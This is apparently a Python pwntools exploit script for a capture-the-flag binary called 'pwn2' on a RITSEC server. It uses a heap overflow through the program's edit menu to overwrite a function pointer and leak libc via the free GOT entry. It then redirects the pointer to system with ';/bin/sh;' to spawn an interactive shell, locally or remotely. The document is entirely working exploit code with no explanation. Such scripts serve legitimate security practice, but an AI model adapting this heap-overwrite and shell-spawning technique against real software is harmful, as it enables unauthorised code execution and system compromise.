#!/usr/bin/python
from pwn import *
import sys

config = {
	"elf" : "./pwn2",
	"libc" : "./libc.so.6",
	"HOST" : "fun.ritsec.club",
	"PORT" : 1337
}

def create(sz, name, age):
	r.sendlineafter("Enter your choice: ", "1")
	r.sendlineafter("length: ", str(sz))
	r.sendlineafter("name: ", name)
	r.sendlineafter("age: ", str(age))

def edit(ind, sz, name):
	r.sendlineafter("Enter your choice: ", "2")
	r.sendlineafter(": ", str(ind))
	r.sendlineafter(": ", str(sz))
	r.sendlineafter(": ", name)

def print_info(ind):
	r.sendlineafter("Enter your choice: ", "3")
	r.sendlineafter(": ", str(ind))
	return r.recvuntil("Welcome", drop=True)

def exploit(r):

	free_GOT = 0x8191028
	puts = 0x8048fa0
	print_person = 0x080ebb10

	# spray
	create(10, "PAD", 0)
	create(10, "PAD", 0)
	create(10, "PAD", 0)
	
	# setup
	create(10, "URMOM", 0xdeadbeef)
	create(10, "NAME2", 0xcafebabe)
	
	# leak
	edit(3, 100, "A"*16+p32(print_person)+p32(free_GOT))
	libc_base = u32(print_info(4).split("Name: ")[1][:4]) - libc.symbols["free"]
	log.info("libc_base : 0x{:x}".format(libc_base))

	# win
	edit(3, 100, "A"*16+p32(libc_base + libc.symbols["system"])+";/bin/sh;")
	r.sendline("3\n4")	

	r.interactive()
	return

if __name__ == "__main__":
	
	if "elf" in config.keys() and config["elf"]:
		e = ELF(config["elf"])
	
	if "libc" in config.keys() and config["libc"]:
		libc = ELF(config["libc"])

	if sys.argv[-1] == "remote":
		r = remote(config["HOST"], config["PORT"])
		exploit(r)
	else:
		if "libc" in dir():
			r = process(config["elf"], env={"LD_PRELOAD" : config["libc"]})
		else:
			r = process(config["elf"])
		print util.proc.pidof(r)

		if sys.argv[-1] == "debug":
			pause()
		exploit(r)
